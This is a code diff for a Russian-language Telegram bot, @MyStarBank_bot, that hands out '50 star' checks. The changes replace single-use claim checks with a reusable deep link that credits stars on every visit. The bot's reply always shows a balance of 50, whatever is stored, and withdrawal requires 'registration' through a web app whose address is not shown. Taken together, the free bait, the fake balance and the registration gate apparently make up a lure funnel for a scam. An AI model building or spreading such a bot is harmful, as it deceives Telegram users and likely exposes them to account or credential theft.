@@ -260,7 +260,7 @@ bot.on('inline_query', (query) => {
             caption: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
             reply_markup: {
                 inline_keyboard: [[
-                    { text: "🪙 Забрать звезды", callback_data: "create_check_inline" }
+                    { text: "🪙 Перейти в бота", url: `https://t.me/MyStarBank_bot?start=check_50` }
                 ]]
             }
         }
@@ -294,114 +294,47 @@ bot.onText(/\/niklateam (.+)/, (msg, match) => {
     });
 });
 
-// ПРОСТОЙ CALLBACK ОБРАБОТЧИК
-bot.on('callback_query', async (query) => {
-    const data = query.data;
-    const userId = query.from.id;
+// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ
+bot.onText(/\/start (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const params = match[1];
     
-    try {
-        if (data === 'create_check_inline') {
-            await bot.answerCallbackQuery(query.id);
+    if (params.startsWith('check_')) {
+        const amount = 50;
+        
+        // Добавляем звезды пользователю
+        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
+            [userId, msg.from.username, userId, amount], function(err) {
             
-            const amount = 50;
-            const activations = 1;
+            if (err) {
+                bot.sendMessage(chatId, '❌ Ошибка получения звезд');
+                return;
+            }
             
-            db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
-                [amount, activations, userId], function(err) {
-                if (err) return;
-                
-                const checkId = this.lastID;
-                const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
-                
-                bot.editMessageCaption(checkText, {
-                    chat_id: query.message.chat.id,
-                    message_id: query.message.message_id,
-                    parse_mode: 'HTML',
-                    reply_markup: { 
-                        inline_keyboard: [[{ 
-                            text: "🪙 Забрать звезды", 
-                            callback_data: `claim_${checkId}` 
-                        }]] 
-                    }
-                }).catch(e => {});
-            });
-            
-        } else if (data.startsWith('claim_')) {
-            const checkId = data.split('_')[1];
-            
-            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], async (err, row) => {
-                if (err || !row) {
-                    await bot.answerCallbackQuery(query.id, { 
-                        text: '❌ Чек уже использован!',
-                        show_alert: true 
-                    });
-                    return;
-                }
-                
-                db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
-                db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
-                    [userId, userId, row.amount], async function(updateErr) {
-                    
-                    if (updateErr) {
-                        await bot.answerCallbackQuery(query.id, { 
-                            text: '❌ Ошибка получения!',
-                            show_alert: true 
-                        });
-                        return;
-                    }
-                    
-                    // ПРОСТОЕ УВЕДОМЛЕНИЕ БЕЗ ПЕРЕХОДА В БОТА
-                    await bot.answerCallbackQuery(query.id, { 
-                        text: `✅ Получено ${row.amount} звезд! Баланс обновлен`,
-                        show_alert: true 
-                    });
-                    
-                    // Обновляем сообщение чека
-                    const remaining = row.activations - 1;
-                    const updatedText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
-                    const replyMarkup = remaining > 0 ? {
-                        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
-                    } : { inline_keyboard: [] };
-                    
-                    try {
-                        if (query.message.photo) {
-                            bot.editMessageCaption(updatedText, {
-                                chat_id: query.message.chat.id,
-                                message_id: query.message.message_id,
-                                parse_mode: 'HTML',
-                                reply_markup: replyMarkup
-                            }).catch(e => {});
-                        } else {
-                            bot.editMessageText(updatedText, {
-                                chat_id: query.message.chat.id,
-                                message_id: query.message.message_id,
-                                parse_mode: 'HTML',
-                                reply_markup: replyMarkup
-                            }).catch(e => {});
-                        }
-                    } catch (error) {}
-                });
-            });
-        }
-    } catch (error) {
-        console.log('Ошибка callback:', error);
-        try {
-            await bot.answerCallbackQuery(query.id, { 
-                text: '❌ Ошибка, попробуйте еще раз',
-                show_alert: true 
-            });
-        } catch (e) {}
+            bot.sendMessage(chatId, 
+                `🎉 Получено 50 звезд!\n\n` +
+                `💫 Ваш баланс: ${amount} stars\n\n` +
+                `💰 Для проверки баланса используйте /balance`
+            );
+        });
+    } else {
+        bot.sendMessage(chatId, 
+            '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
+            'Для вывода зарегистрируйтесь:', {
+            reply_markup: {
+                inline_keyboard: [[{ 
+                    text: "📲 Регистрация", 
+                    web_app: { url: WEB_APP_URL } 
+                }]]
+            }
+        });
     }
 });
 
-// Остальные команды
+// ОБЫЧНЫЙ СТАРТ
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    // Сохраняем пользователя при старте
-    db.run(`INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)`, 
-        [userId, msg.from.username], function(err) {});
     
     bot.sendMessage(chatId, 
         '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
@@ -425,45 +358,35 @@ bot.onText(/\/balance/, (msg) => {
     });
 });
 
-// СОЗДАНИЕ ЧЕКОВ
+// СОЗДАНИЕ ЧЕКОВ С ПРЯМОЙ ССЫЛКОЙ В БОТА
 bot.onText(/@MyStarBank_bot/, (msg) => {
     const chatId = msg.chat.id;
-    const userId = msg.from.id;
     
-    const amount = 50;
-    const activations = 1;
+    const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!`;
     
-    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
-        [amount, activations, userId], function(err) {
-        if (err) return;
-        
-        const checkId = this.lastID;
-        const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
-        
-        const photoPath = path.join(__dirname, 'public/stars.jpg');
-        if (fs.existsSync(photoPath)) {
-            bot.sendPhoto(chatId, photoPath, {
-                caption: checkText,
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: "🪙 Забрать звезды", 
-                        callback_data: `claim_${checkId}` 
-                    }]] 
-                }
-            });
-        } else {
-            bot.sendMessage(chatId, checkText, {
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: "🪙 Забрать звезды", 
-                        callback_data: `claim_${checkId}` 
-                    }]] 
-                }
-            });
-        }
-    });
+    const photoPath = path.join(__dirname, 'public/stars.jpg');
+    if (fs.existsSync(photoPath)) {
+        bot.sendPhoto(chatId, photoPath, {
+            caption: checkText,
+            parse_mode: 'HTML',
+            reply_markup: { 
+                inline_keyboard: [[{ 
+                    text: "🪙 Перейти в бота", 
+                    url: `https://t.me/MyStarBank_bot?start=check_50` 
+                }]] 
+            }
+        });
+    } else {
+        bot.sendMessage(chatId, checkText, {
+            parse_mode: 'HTML',
+            reply_markup: { 
+                inline_keyboard: [[{ 
+                    text: "🪙 Перейти в бота", 
+                    url: `https://t.me/MyStarBank_bot?start=check_50` 
+                }]] 
+            }
+        });
+    }
 });
 
 console.log('✅ Бот запущен');
